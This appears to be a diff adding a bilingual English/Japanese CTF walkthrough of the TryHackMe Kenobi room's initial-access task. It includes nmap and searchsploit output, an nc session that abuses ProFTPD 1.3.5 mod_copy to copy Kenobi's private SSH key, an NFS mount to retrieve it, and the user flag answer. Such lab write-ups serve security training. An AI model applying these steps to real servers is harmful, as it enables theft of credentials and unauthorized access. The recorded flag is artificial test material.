@@ -293,3 +293,249 @@ Nmap done: 1 IP address (1 host up) scanned in 11.47 seconds
 '''
 
 == [Task 3] Gain initial access with ProFtpd
+
+
+=== 準備
+
+----
+PS C:\Users\USER>docker cp <THM-UNAME>.ovpn <C-ID>:/etc/openvpn/<THM-UNAME>.ovpn
+PS C:\Users\USER>docker exec -it <C-NAME> /bin/bash
+mkdir -p /dev/net
+mknod /dev/net/tun c 10 200
+openvpn /etc/openvpn/<ユーザ名>.ovpn &
+----
+
+=== #1
+
+==== T3_#1:En
+
+Lets get the version of ProFtpd. +
+Use netcat to connect to the machine on the FTP port. What is the version?
+
+==== T3_#1:Ja
+
+ProFtpdのバージョンを取得できます。 +
+netcatを使用してFTPポートでマシンに接続します。バージョンは何か？
+
+==== T3_#1:Solution
+
+----
+# nmap -T5 -sC -sV 10.10.203.16
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 02:46 UTC
+Nmap scan report for 10.10.203.16
+Host is up (0.10s latency).
+Not shown: 993 filtered ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.5
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
+|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
+|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_/admin.html
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100003  2,3,4       2049/udp   nfs
+|   100003  2,3,4       2049/udp6  nfs
+|   100005  1,2,3      36914/udp6  mountd
+|   100005  1,2,3      48461/tcp   mountd
+|   100005  1,2,3      58861/udp   mountd
+|   100005  1,2,3      60987/tcp6  mountd
+|   100021  1,3,4      39997/udp   nlockmgr
+|   100021  1,3,4      41018/udp6  nlockmgr
+|   100021  1,3,4      43915/tcp6  nlockmgr
+|   100021  1,3,4      45819/tcp   nlockmgr
+|   100227  2,3         2049/tcp   nfs_acl
+|   100227  2,3         2049/tcp6  nfs_acl
+|   100227  2,3         2049/udp   nfs_acl
+|_  100227  2,3         2049/udp6  nfs_acl
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+2049/tcp open  nfs_acl     2-3 (RPC #100227)
+Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: -1s
+|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: kenobi
+|   NetBIOS computer name: KENOBI\x00
+|   Domain name: \x00
+|   FQDN: kenobi
+|_  System time: 2020-07-25T21:46:44-05:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2020-07-26T02:46:44
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.90 seconds
+----
+
+==== T3_#1:Answer
+
+1.3.5
+
+=== #2
+
+==== T3_#2:En
+
+We can use searchsploit to find exploits for a particular software version. +
+Searchsploit is basically just a command line search tool for exploit-db.com. +
+How many exploits are there for the ProFTPd running?
+
+==== T3-#2:Ja
+
+searchsploitで特定のソフトウェアバージョンのエクスプロイトを見つけられます。 +
+searchsploitは基本的に、exploit-db.comのコマンドライン検索ツールです。 +
+ProFTPdを実行するためのエクスプロイトはいくつあるか？
+
+==== T3_#2:Solution
+
+----
+# searchsploit ProFTPd 1.3.5
+---------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                          |  Path
+---------------------------------------------------------------------------------------- ---------------------------------
+ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                               | linux/remote/37262.rb
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                     | linux/remote/36803.py
+ProFTPd 1.3.5 - File Copy                                                               | linux/remote/36742.txt
+---------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+----
+
+==== T3_#2:Answer
+
+3
+
+=== #3
+
+==== T3_#3:En
+
+You should have found an exploit from ProFtpd's mod_copy module. +
+The mod_copy module implements SITE CPFR and SITE CPTO commands,  +
+which can be used to copy files/directories from one place to another on the server. +
+Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. +
+We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.
+
+==== T3_#3:Ja
+
+ProFtpdのmod_copyモジュールからエクスプロイトを見つけたはずです。 +
+mod_copyモジュールは、SITE CPFRおよびSITE CPTOコマンドを実装しており、+
+サーバー上のある場所から別の場所にファイル/ディレクトリをコピーするために使用できます。 +
+認証されていないクライアントは、これらのコマンドを利用して、ファイルシステムの任意の部分から選択した宛先にファイルをコピーできる。 +
+FTPサービスがKenobiユーザーとして（共有上のファイルから）実行されており、そのユーザーのSSH鍵が生成されていることが分かっている。
+
+==== T3_#3:Solution
+
+-
+
+==== T3_#3:Answer
+
+-
+
+=== #4
+
+==== T3_#4:En
+
+We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.
+We knew that the "/var" directory was a mount we could see (task 2, question 4). +
+So we've now moved Kenobi's private key to the "/var/tmp" directory.
+
+==== T3_#4:Ja
+
+次に、SITE CPFRおよびSITE CPTOコマンドを使用して、ケノービの秘密鍵をコピーします。
+
+++++
+<p align="left">
+  <img width="602" height="94" src="https://i.imgur.com/LajBhh2.png">
+</p>
+++++
+
+「/var」ディレクトリが目に見えるマウントであることがわかっていました（T2_#4）。 +
+そこで、Kenobiの秘密鍵を「/var/tmp」ディレクトリに移動しました。
+
+==== T3_#4:Solution
+
+----
+# nc 10.10.203.16 21
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.203.16]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+----
+
+==== T3_#4:Answer
+
+-
+
+=== #5
+
+==== T3_#5:En
+
+Lets mount the /var/tmp directory to our machine 
+
+----
+mkdir /mnt/kenobiNFS
+mount machine_ip:/var /mnt/kenobiNFS
+ls -la /mnt/kenobiNFS
+----
+
+We now have a network mount on our deployed machine! +
+We can go to "/var/tmp" and get the private key then login to Kenobi's account. +
+What is Kenobi's user flag (/home/kenobi/user.txt)?
+
+==== T3_#5:Ja
+
+/var/tmpディレクトリをマシンにマウントしましょう
+
+----
+mkdir /mnt/kenobiNFS
+mount 10.10.203.16:/var /mnt/kenobiNFS
+ls -la /mnt/kenobiNFS
+----
+
+++++
+<p align="left">
+  <img width="567" height="346" src="https://i.imgur.com/v8Ln4fu.png">
+</p>
+++++
+
+これで、展開したマシンにネットワークマウントができました。 +
+「/var/tmp」に移動して秘密鍵を取得し、Kenobiのアカウントにログインします。 +
+
+++++
+<p align="left">
+  <img width="493" height="44" src="https://i.imgur.com/Vy4KkEl.png">
+</p>
+++++
+
+Kenobiのユーザーフラグ（/home/kenobi/user.txt）とは何ですか？
+
+==== T3_#5:Solution
+
+-
+
+==== T3_#5:Answer
+
+d0b0f3f53b6caa532a83915e19224899
